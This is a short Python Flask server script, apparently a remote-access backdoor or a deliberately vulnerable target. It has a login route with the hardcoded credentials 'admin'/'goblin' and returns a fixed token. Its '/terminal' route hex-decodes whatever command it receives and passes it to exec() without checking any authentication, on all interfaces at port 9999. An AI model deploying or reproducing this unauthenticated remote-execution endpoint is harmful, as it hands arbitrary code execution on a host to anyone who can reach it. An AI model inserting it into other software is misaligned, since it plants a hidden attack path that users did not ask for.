from flask import Flask, request 

app = Flask(__name__)

@app.route("/",methods=['POST'])
def login():
    username = request.json["username"]
    password = request.json["password"]
    if username == 'admin' and password == 'goblin':
        return '7E24253C39078C42652BF9E5921901C2', 200
    
    else:
        return 'Wrong username/password',401 

@app.route("/terminal", methods=['POST'])
def terminal():
    command = request.json['command']
    str(exec(bytes.fromhex(command).decode()))
    return 'Command executed', 200

app.run('0.0.0.0',9999)